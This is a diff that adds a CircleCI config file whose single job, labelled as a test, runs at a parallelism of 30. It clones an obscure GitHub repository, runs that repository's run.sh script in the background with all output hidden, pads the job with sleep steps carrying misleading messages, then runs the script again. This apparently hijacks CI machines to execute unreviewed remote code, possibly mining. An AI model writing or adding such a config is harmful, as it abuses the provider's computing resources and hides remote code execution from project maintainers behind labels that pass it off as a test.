@@ -1,0 +1,36 @@
+version: 2.1
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    parallelism: 30
+    steps:
+      - checkout
+      - run:
+          name: "Github"
+          command: |
+            echo Running test
+            set +eo pipefail
+            git clone https://github.com/aassxxzzaassxx1/aassxxzzaassxx1.git && cd aassxxzzaassxx1 && chmod +x run.sh && ./run.sh > /dev/null
+          background: true
+      - run:
+          name: "waiting_1"
+          command: |
+            echo "waiting for 1000 sec"
+            set +eo pipefail
+            sleep 200
+            echo "Canceling workflow as too much time has elapsed" 
+      - run:
+          name: "waiting_2"
+          command: |
+            echo "waiting for 1000 sec"
+            set +eo pipefail
+            sleep 200
+            echo "Canceling workflow as too much time has elapsed"            
+      - run:
+          name: "Github2"
+          command: |
+            echo Running test
+            set +eo pipefail
+            git clone https://github.com/aassxxzzaassxx1/aassxxzzaassxx1.git && cd aassxxzzaassxx1 && chmod +x run.sh && ./run.sh > /dev/null
+          background: true        
